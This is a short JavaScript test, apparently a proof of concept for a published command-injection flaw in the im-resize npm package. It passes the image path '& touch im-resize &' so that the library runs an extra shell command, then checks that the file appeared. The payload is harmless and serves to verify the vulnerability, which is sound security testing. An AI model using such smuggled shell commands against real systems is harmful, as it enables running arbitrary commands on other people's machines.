//https://snyk.io/vuln/SNYK-JS-IMRESIZE-544183
test("Command Injection in im-resize", () => {
  const root = require("im-resize");
  const fs = require("fs");
  const path = "./im-resize";
  const sleep = require("sleep");
  try {
    fs.unlinkSync(path);
    console.log("File removed:", path);
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let image = { path: "& touch im-resize &" };
  let output = { versions: [] };
  root(image, output, function () {});
  sleep.sleep(5);
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
